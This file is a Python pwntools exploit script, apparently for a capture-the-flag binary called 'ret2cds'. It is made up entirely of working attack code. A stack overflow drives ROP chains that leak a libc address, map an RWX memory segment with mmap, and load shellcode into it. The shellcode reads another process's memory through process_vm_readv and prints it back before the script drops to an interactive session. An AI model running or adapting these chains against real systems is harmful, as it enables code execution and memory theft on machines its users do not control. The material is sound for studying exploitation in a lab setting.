#!/usr/bin/env python3

from pwn import *

the_binary = "./ret2cds"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
elif args.STRACE:
    io = process(["strace", "-o", "trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        break *0x4012ba
        ignore 1 2

        # set breakpoint pending on
        # break *0xdead0000

        continue
    """)

def libc_off(offset):
    return libc.address + offset

class Gadgets:
    elf_main = 0x40123a

    # 0x0000000000401016: ret;
    ret = 0x0000000000401016

    # 0x000000000040131b: pop rdi; ret;
    pop_rdi = 0x000000000040131b

    # 0x0000000000401319: pop rsi; pop r15; ret;
    pop_rsi_pop_r15 = 0x0000000000401319

    # 0x00000000001626d6: pop rdx; pop rbx; ret;
    @property
    def pop_rdx_pop_rbx(self):
        return libc_off(0x00000000001626d6)

    # 0x000000000004a550: pop rax; ret;
    @property
    def pop_rax(self):
        return libc_off(0x000000000004a550)

    # 0x00000000001536e9: pop rax; call rax;
    @property
    def pop_rax_call_rax(self):
        return libc_off(0x00000000001536e9)

    # 0x0000000000156108: mov r8, rax; mov rax, r8; pop rbx; ret;
    @property
    def mov_r8_rax_mov_rax_r8_pop_rbx(self):
        return libc_off(0x0000000000156108)

    # 0x000000000007d2f0: mov r9, rax; pop r12; pop r13; mov rax, r9; pop r14; ret;
    @property
    def mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14(self):
        return libc_off(0x000000000007d2f0)

    # 0x000000000007b0cb: mov r10, rdx; jmp rax;
    @property
    def mov_r10_rdx_jmp_rax(self):
        return libc_off(0x000000000007b0cb)

    # 0x0000000000066229: syscall; ret;
    @property
    def syscall(self):
        return libc_off(0x0000000000066229)

class Const:
    rip_offset = 0x108

    SYS_process_vm_readv = 310
    SYS_process_vm_writev = 311

    mmap_base = 0xdead0000
    iovec_local = 0xdead3000
    iovec_remote = 0xdead6000
    iovec_size = 0x3000
    mmap_size = 0x9000

    hello_msg = "hello"
    msg_prologue = "__mbegin__"
    msg_epilogue = "__mend__"
    process_read_err = "pread err"
    process_write_err = "pwrite err"

    cds_rwx_base = 0x800000000
    cds_rwx_size = 0x2000

shellcode = f"""
    jmp do_it

hello_msg:
    .string "{Const.hello_msg}"
    .byte 0
process_read_err:
    .string "{Const.process_read_err}"
    .byte 0
process_write_err:
    .string "{Const.process_write_err}"
    .byte 0
msg_prologue:
    .string "{Const.msg_prologue}"
    .byte 0
msg_epilogue:
    .string "{Const.msg_epilogue}"
    .byte 0

do_it:
    lea rdi,[rip+hello_msg]
    mov rsi,{len(Const.hello_msg)}
    call echo_msg

    mov rdi,675
    mov rsi,0xdeadbeef
    mov rdx,0x2000
    call read_process_mem

    call exit

/* Args:
    - rdi: Address holding the data to print.
    - rsi: Length of data to print.
*/
echo_data:
    mov rdx,rsi
    mov rsi,rdi
    mov rdi,STDOUT_FILENO
    mov rax,SYS_write
    syscall
    ret

echo_prologue:
    lea rdi,[rip+msg_prologue]
    mov rsi,{len(Const.msg_prologue)}
    call echo_data
    ret

echo_epilogue:
    lea rdi,[rip+msg_epilogue]
    mov rsi,{len(Const.msg_epilogue)}
    call echo_data
    ret

/* Same as echo_data, but prepends and appends a message prologue/epilogue. */
echo_msg:
    push rdi
    push rsi
    call echo_prologue
    pop rsi
    pop rdi
    call echo_data
    call echo_epilogue
    ret

/* Args:
    - rdi: PID of process whose memory to read.
    - rsi: Memory address to read from
    - rdx: Length of region to read
   Read data is placed into the iovec_local region.
*/
read_process_mem:
    mov rcx,rsi
    mov rbx,rdx
    /* Setup local iovec, indicating where to write the data read from the
      remote process. */
    mov rsi,{hex(Const.iovec_local)}
    mov dword ptr [rsi+0],{hex(Const.iovec_local+0x10)}
    mov [rsi+8],rbx
    mov rdx,1
    /* Setup remote iovec, indicating where we want to read from in the remote
       process. */
    mov r10,{hex(Const.iovec_remote)}
    mov [r10+0],rcx
    mov [r10+8],rbx
    mov r8,1
    /* No flags. */
    mov r9,0
    /* Do the syscall. */
    mov rax,{Const.SYS_process_vm_readv}
    syscall
    /* rax now holds how many bytes were read from the remote process memory,
       or -1 on error. */
    cmp rax,0
    jle read_process_mem_err
    /* No error, write the process memory back to ourselves. */
    mov rdi,{hex(Const.iovec_local+0x10)}
    mov rsi,rax
    call echo_msg
    ret
read_process_mem_err:
    lea rdi,[rip+process_read_err]
    mov rsi,{len(Const.process_read_err)}
    call echo_msg
    ret

/* TODO: we may need to read() in from this script to determine what we 
         want to write */
write_process_mem:
    nop
    ret

exit:
    mov rax,SYS_exit
    syscall
"""
shellcode = asm(shellcode, vma=Const.mmap_base)
log.info("Shellcode length: %i" % len(shellcode))

def recv_shellcode_msg():
    io.recvuntil(Const.msg_prologue)
    msg = io.recvuntil(Const.msg_epilogue, drop=True) 
    return msg

g = Gadgets()

def do_rop(*gadgets):
    chain = b""
    chain += b"A"*Const.rip_offset
    chain += flat(*gadgets)
    assert len(chain) <= 0x200
    io.sendafter("warden: ", chain)

# leak a libc address
do_rop(
    g.pop_rdi,
    constants.STDOUT_FILENO,
    g.pop_rsi_pop_r15,
    elf.got.read,
    0xdeadbeef,
    # rdx already equals 0x1d from the program's last write
    elf.plt.write,
    g.elf_main
)
io.recvuntil("escaping...\n")
leak = io.recvuntil("Welcome", drop=True)
libc_read = u64(leak[1:9])
libc.address = libc_read - libc.sym.read
log.info("read@libc: %#x" % libc_read)
log.info("libc base: %#x" % libc.address)

# map a rwx segment
do_rop(
    # rdi = addr
    g.pop_rdi,
    Const.mmap_base,
    # rsi = len
    g.pop_rsi_pop_r15,
    Const.mmap_size,
    0xdeadbeef,
    # r10 = flags
    g.pop_rax,
    g.ret,
    g.pop_rdx_pop_rbx,
    constants.MAP_PRIVATE | constants.MAP_FIXED | constants.MAP_ANON,
    0xdeadbeef,
    g.mov_r10_rdx_jmp_rax,
    # rdx = prot; do this after r10 since r10's gadget clobbers rdx
    g.pop_rdx_pop_rbx,
    constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC,
    0xdeadbeef,
    # r8 = fd
    g.pop_rax,
    0xffffffffffffffff,
    g.mov_r8_rax_mov_rax_r8_pop_rbx,
    0xdeadbeef,
    # r9 = off
    g.pop_rax,
    0,
    g.mov_r9_rax_pop_r12_pop_r13_mov_rax_r9_pop_r14,
    0xdeadbeef,
    0xdeadbeef,
    0xdeadbeef,
    # rax = SYS_mmap
    g.pop_rax,
    constants.SYS_mmap,
    g.syscall,
    # back to main one last time...
    g.elf_main
)

# read shellcode into the rwx segment and jump to it
do_rop(
    # rdi = fd
    g.pop_rdi,
    constants.STDIN_FILENO,
    # rsi = buf
    g.pop_rsi_pop_r15,
    Const.mmap_base,
    0xdeadbeef,
    # rdx = len
    g.pop_rdx_pop_rbx,
    len(shellcode),
    0xdeadbeef,
    # rax = SYS_read
    g.pop_rax,
    constants.SYS_read,
    g.syscall,
    # jump to shellcode
    g.pop_rax_call_rax,
    Const.mmap_base
)

sleep(2)
io.send(shellcode)

msg = recv_shellcode_msg()
assert msg.decode() == Const.hello_msg
log.info("Got hello message from shellcode...")

msg = recv_shellcode_msg()
print(msg)

io.interactive()
